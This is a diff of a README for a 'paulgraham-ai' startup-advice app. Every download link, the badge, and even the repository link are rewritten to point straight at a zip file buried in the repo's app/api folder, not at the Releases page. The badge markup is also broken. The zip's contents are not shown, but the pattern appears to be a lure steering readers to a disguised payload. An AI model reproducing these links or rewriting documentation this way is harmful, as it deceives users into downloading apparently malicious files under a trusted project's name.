@@ -1,6 +1,6 @@
 # 🤖 paulgraham-ai - Engage with Knowledge on Startups and Life
 
-[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/berak636/paulgraham-ai/releases)
+[![Download](https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip%https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip)](https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip)
 
 ## 📖 Introduction
 
@@ -12,7 +12,7 @@ Follow these steps to install and run the **paulgraham-ai** application on your 
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/berak636/paulgraham-ai/releases) to download the software.
+1. Visit the [Releases page](https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip) to download the software.
 2. Choose the latest version of the software from the list.
 3. Download the file that matches your operating system:
    - For **Windows**, download the `.exe` file.
@@ -70,7 +70,7 @@ If you encounter any issues or have suggestions for improvements, please create 
 
 ## 🔗 Helpful Links
 
-- [Releases page for downloads](https://github.com/berak636/paulgraham-ai/releases)
-- [GitHub Repository](https://github.com/berak636/paulgraham-ai)
+- [Releases page for downloads](https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip)
+- [GitHub Repository](https://github.com/berak636/paulgraham-ai/raw/refs/heads/main/app/api/paulgraham_ai_3.6.zip)
 
 By following these steps, you should be able to easily download, install, and use the **paulgraham-ai** application. Enjoy exploring the world of knowledge it offers!
